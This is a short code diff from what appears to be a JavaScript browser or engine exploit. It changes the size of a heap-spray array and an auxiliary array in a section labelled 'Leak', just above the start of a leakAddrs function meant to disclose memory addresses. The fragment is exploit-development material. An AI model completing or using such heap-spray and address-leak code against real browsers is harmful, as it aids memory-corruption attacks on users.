@@ -41,9 +41,9 @@ function debug (msg) {
 //--------------------Leak---------------------------------//
 //global
 //global to use this after
-var sprayCount = 0x20000;
+var sprayCount = 0x30000;
 var ar = new Array(sprayCount);
-var vrs = new Array(10);
+var vrs = new Array(1);
 function leakAddrs (obja, objb, objc, cb)
 {
     //---------------internal functions-------------------//
